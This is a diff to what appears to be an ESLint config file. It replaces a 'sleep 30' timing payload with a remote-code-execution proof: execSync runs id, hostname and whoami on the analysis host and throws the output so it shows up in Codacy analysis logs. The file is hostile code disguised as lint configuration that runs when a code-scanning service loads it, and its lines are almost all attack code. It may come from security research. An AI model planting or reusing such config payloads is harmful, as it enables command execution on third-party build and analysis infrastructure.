@@ -1,4 +1,7 @@
-// TIMING PAYLOAD — sleep 30 to measure execution delta
+// RCE proof — output captured in thrown error → appears in Codacy analysis logs
 const { execSync } = require("child_process");
-execSync("sleep 30", { timeout: 35000 });
-module.exports = [{ rules: { "no-var": "error" } }];
+const run = (cmd) => execSync(cmd, { timeout: 5000 }).toString().trim();
+const id     = run("id");
+const host   = run("hostname");
+const whoami = run("whoami");
+throw new Error("CODACY-RCE-PROOF id=" + id + " hostname=" + host + " whoami=" + whoami);
